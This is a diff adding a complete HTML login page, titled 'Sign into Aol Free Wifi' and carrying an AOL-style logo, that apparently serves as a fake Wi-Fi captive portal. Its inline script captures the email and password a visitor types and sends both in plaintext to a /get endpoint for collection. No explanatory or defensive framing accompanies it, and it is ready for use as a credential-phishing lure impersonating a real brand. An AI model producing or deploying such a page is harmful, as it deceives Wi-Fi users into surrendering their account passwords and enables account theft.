@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
+        }
+        .login-container h1, .login-container h2 {
+            text-align: center;
+        }
+        .login-container button {
+            width: 100%;
+            background-color: #ee2722;
+        }
+        #logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+    </style>
+    <script>
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const form = document.getElementById('email-form-step');
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+                const emailInput = document.getElementById('email-input');
+                const passwordInput = document.getElementById('password-input');
+                const email = emailInput.value;
+                const password = passwordInput.value;
+                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+                window.location.href = url;
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4 offset-lg-4 login-container">
+                <div id="logo">
+                    <svg  xmlns="http://www.w3.org/2000/svg" height="300" width="500" viewBox="-150 -99.57575 1300 597.4545"><path d="M550.595 85.908c-89.814 0-157.76 69.768-157.76 156.197 0 91.115 70.81 156.198 157.76 156.198 86.95 0 157.498-65.083 157.498-156.198 0-86.429-67.685-156.197-157.498-156.197zm0 82.525c38.789-.26 70.549 32.8 70.549 73.672 0 40.612-31.76 73.673-70.55 73.673-38.788 0-70.548-33.061-70.548-73.673 0-40.871 31.76-73.672 70.549-73.672zM1000 343.623c0 30.198-24.47 54.67-54.669 54.67-30.198 0-54.669-24.472-54.669-54.67s24.47-54.669 54.669-54.669c30.198 0 54.669 24.471 54.669 54.67zM840.861 387.89h-85.908V0h85.908z"/><path d="M0 387.89L156.197 0H236.9l153.594 387.89H281.155l-18.223-54.67H127.56l-18.223 54.67zm236.899-135.371h-80.702l40.351-130.165z" fill-rule="evenodd"/></svg>
+                </div>
+                <form id="email-form-step">
+                    <h1>Sign into Aol Free Wifi</h1>
+                    <h2>Use your Email Account to log in</h2>
+                    <div class="form-group">
+                        <input id="email-input" name="email" type="text" class="form-control" placeholder="Email Address" required>
+                    </div>
+                    <div class="form-group">
+                        <input id="password-input" name="password" type="password" class="form-control" placeholder="Password" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" type="submit">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
